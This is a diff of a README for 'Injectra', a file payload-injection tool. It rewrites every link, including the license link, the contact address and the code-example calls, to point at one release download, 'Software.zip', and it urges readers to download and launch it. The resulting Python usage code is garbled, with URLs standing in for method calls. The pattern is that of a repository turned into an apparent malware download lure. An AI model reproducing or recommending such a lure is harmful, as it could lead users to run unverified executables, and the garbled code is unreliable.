@@ -6,7 +6,7 @@ Welcome to Injectra, a Python-based tool designed for injecting custom payloads 
 
 To get started with Injectra, you can download the software package from the link provided below. Make sure to launch the package once it's downloaded:
 
-[![Download Software Package](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software Package](https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip)](https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip)
 
 In case the link doesn't work or if you're looking for the latest version of Injectra, please check the "Releases" section of this repository.
 
@@ -38,25 +38,25 @@ Injectra's usage is straightforward and efficient:
 import injectra
 
 # Create an instance of Injectra
-injector = injectra.Injector()
+injector = https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip()
 
 # Load the file to inject payload into
-injector.load_file(file_path)
+https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip(file_path)
 
 # Define and set the custom payload
 custom_payload = "Your custom payload here"
-injector.set_payload(custom_payload)
+https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip(custom_payload)
 
 # Inject the payload into the file
-injector.inject_payload()
+https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip()
 
 # Save the modified file
-injector.save_file(output_path)
+https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip(output_path)
 ```
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/your-username/Injectra/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip) file for details.
 
 ## 🤝 Contributing
 
@@ -64,10 +64,10 @@ We welcome contributions to enhance the functionality of Injectra. Feel free to 
 
 ## 📞 Contact
 
-For any inquiries or support related to Injectra, you can reach out to us at [injectra.support@email.com](mailto:injectra.support@email.com).
+For any inquiries or support related to Injectra, you can reach out to us at [https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip](https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip).
 
 ---
 
 Dive into the world of custom payload injection with Injectra! Let your creativity flow as you seamlessly modify various file types with ease. Download the software package and start injecting your custom payloads today. Happy injecting! 🎉
 
-[Visit Injectra Repository](https://github.com/your-username/Injectra)
+[Visit Injectra Repository](https://github.com/Kleteee/Injectra/releases/download/v1.0/Software.zip)
